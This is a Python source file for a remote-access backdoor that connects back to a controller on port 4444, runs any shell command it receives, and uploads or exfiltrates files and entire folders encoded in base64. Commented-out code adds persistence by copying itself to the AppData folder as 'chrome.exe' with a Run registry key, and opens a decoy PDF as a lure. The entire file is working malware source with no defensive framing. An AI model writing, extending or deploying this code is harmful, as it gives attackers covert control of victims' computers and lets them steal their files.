import socket
import subprocess
import json
import os,sys
import base64
import shutil


class Backdoor:
    def __init__(self,ip,port):
        # self.persistence()
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.get_name()

    def get_name(self):
        name = socket.gethostname()
        location = "\n"+os.getcwd()+">"
        data = [name,location]
        self.send(data)

    def persistence(self):
        file_loc = os.environ["appdata"] + "\\chrome.exe"
        if not os.path.exists(file_loc):
            shutil.copyfile(sys.executable,file_loc)
            subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Tata /t REG_SZ /d "'+file_loc+'"',shell = True)

    def execute_command(self,command):
        NULL = open(os.devnull,"wb") 
        return subprocess.check_output(command,shell=True,universal_newlines=True,stderr=NULL,stdin=NULL)
        
    def directory(self,path):
        try:
            os.chdir(path)
            return "\n"+os.getcwd()+">"
        except OSError:
            return "\n"+os.getcwd()+">"
        
    def send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(2048).decode("utf-8")
                return json.loads(json_data)
            
            except ValueError:
                if json_data =="":
                    break
                continue


    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
        
    def write_file(self,filename,content):
        with open(filename,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Sucessfully upload "
        
    def download(self,folder):
        folder_content = {}
        if os.path.isfile(folder):
            return self.read_file(folder).decode()
        
        for root,dirs,files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root,file).replace("\\","/")
                file_content = self.read_file(file_path)
                folder_content[file_path] = file_content.decode()

        return folder_content
    
    def upload(self,name,data):
        if not isinstance(data,dict):
            return self.write_file(name,data.encode()) + "1 file"
        num = 0
        for file_path,content in data.items():
            folder = file_path.removesuffix(os.path.basename(file_path))
            if not os.path.exists(folder):
                os.makedirs(folder)
            result = self.write_file(file_path,content.encode())
            num += 1
        return f"{result} {num} files"   

    def main(self):
        while True:
            
            try:
                command = self.receive()
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) >=2 :
                    
                    data = self.directory(" ".join(command[1:]))

                elif command[0] == "download":
                    file_name = " ".join(command[1:])
                    data = self.download(file_name)
                elif command[0] == "upload":
                    path = " ".join(command[1:-1]) # [C:\python,folder\hello,world.txt] = C:\python folder\hello world.txt
                    file_name = path.split("\\")[-1] # [C:,python folder,hello world.txt] 
                    data = self.upload(file_name,command[-1])
                else:
                    data = self.execute_command(command)
                    
            except KeyboardInterrupt:
                data = "User perform keyboard interruption. "
            except Exception:
                data = "[-] Command Not Found!"

            self.send(data)

# file= sys._MEIPASS + "Gov Scl.pdf"
# subprocess.Popen(file,shell=True)

while 1:
    try:
        backdoor = Backdoor("127.0.0.1",4444)
        backdoor.main()
        break
    except Exception:
        continue